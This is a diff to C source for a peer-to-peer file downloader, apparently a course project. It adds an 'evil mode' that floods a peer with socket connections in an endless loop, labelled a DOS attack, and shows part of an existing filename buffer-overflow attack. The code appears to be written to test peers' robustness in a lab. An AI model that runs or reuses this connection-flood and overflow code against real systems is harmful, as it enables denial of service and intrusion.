@@ -540,7 +540,31 @@ static void task_download(task_t *t, task_t *tracker_task)
 	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
 		   && t->peer_list->port == listen_port)
 		goto try_again;
-
+	
+	// Security Attack: try a DOS attack
+	if (evil_mode == 2) 
+	{
+		message("* Try attacking %s:%d with '%s' DOS\n", 
+			inet_ntoa(t->peer_list->addr), 
+			t->peer_list->port, t->filename);
+		// try once
+		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+		if (t->peer_fd == -1) {
+			error("* Error: can't connect to peer: %s\n", strerror(errno));
+			goto try_again;
+		}
+		// attack repeatedly
+		while (1) 
+		{
+			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+			if (t->peer_fd == -1) {
+				error("* Successful DOS attack - user can' no longer't connect to peer any more: %s\n"
+					, strerror(errno));
+				goto try_again;
+			}
+		}
+	}
+	
 	// Connect to the peer and write the GET command
 	message("* Connecting to %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
@@ -553,7 +577,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 	
 	// Security Attack: attempt buffer overflow
 	if (evil_mode == 1) {
-		message("* Attacking with filename buffer overflow\n");
+		message("* Try attacking with filename buffer overflow\n");
 
 		// create buffer overflow input
 		char overflow[FILENAMESIZ * 2];
@@ -839,7 +863,7 @@ int main(int argc, char *argv[])
 	prev_task = NULL;
 
 	// Security Attack: begin downloader attacks in concurrent processes
-	if (evil_mode == 1) 
+	if (evil_mode == 1 || evil_mode == 2) 
 	{
 		strncpy(file, "cat0.jpg", 8);
 		file[8] = '\0';
